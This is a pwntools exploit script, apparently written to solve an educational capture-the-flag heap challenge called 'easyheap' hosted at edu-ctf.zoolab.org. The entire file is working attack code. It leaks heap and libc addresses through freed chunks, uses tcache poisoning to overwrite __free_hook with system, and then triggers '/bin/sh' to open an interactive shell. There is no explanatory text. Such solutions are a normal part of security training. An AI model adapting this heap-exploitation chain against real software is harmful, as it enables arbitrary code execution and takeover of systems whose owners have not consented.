#!/usr/bin/python3

from pwn import *

context.terminal = ['tmux', 'splitw', '-v']
context.arch = 'amd64'

if args['R']:
    r = remote('edu-ctf.zoolab.org', 30211)
else:
    r = process('./easyheap')

def _add(idx, leng, name):
    r.sendlineafter('> ', '1')
    r.sendlineafter('Index: ', str(idx))
    r.sendlineafter('Length of name: ', str(leng))
    r.sendlineafter('Name: ', name)
    r.sendlineafter('Price: ', str(0))

def _delete(idx):
    r.sendlineafter('> ', '2')
    r.sendlineafter('delete: ', str(idx))

def _edit(idx, name):
    r.sendlineafter('> ', '3')
    r.sendlineafter('edit: ', str(idx))
    r.sendlineafter('Name: ', name)
    r.sendlineafter('Price: ', str(0))

def _list():
    r.sendlineafter('> ', '4')

def _find(idx):
    r.sendlineafter('> ', '5')
    r.sendlineafter('Index: ', str(idx))

# leak heap base address
_add(0, 0x10, 'dummy')
_add(1, 0x10, 'dummy')
_delete(0)
_delete(1)
_list()
r.recvuntil('Index:\t')
heap = int(r.recvuntil('\n')[:-1]) - 0x10
print(f'heap: {hex(heap)}')

# leak libc base address
_add(2, 0x20, 'dummy')
_edit(2, p64(heap + 0x378)) # address of bk
_add(4, 0x410, 'dummy')
_add(5, 0x410, 'dummy')
_delete(4)
_find(0)
r.recvuntil('Name: ')
libc_base = u64(r.recv(6).ljust(8, b'\x00')) - 0x1ebbe0
print(f'libc_base: {hex(libc_base)}')

free_hook = libc_base + 0x1eeb28
system = libc_base + 0x55410

# clear unsorted bin and 0x30 tcache bin
_add(15, 0x410, 'dummy')

# tcache poisoning
_add(6, 0x10, 'dummy')
_add(7, 0x10, 'dummy')
_delete(7)
_delete(6)

_add(8, 0x20, 'dummy')
_add(9, 0x10, 'dummy')

_delete(9)

_edit(8, p64(heap + 0xc40))
_edit(7, p64(heap + 0xc10))
_delete(9)

_edit(7, p64(free_hook - 8))
_add(10, 0x20, b'/bin/sh\x00' + p64(system))
# gdb.attach(r)
_delete(9)

r.interactive()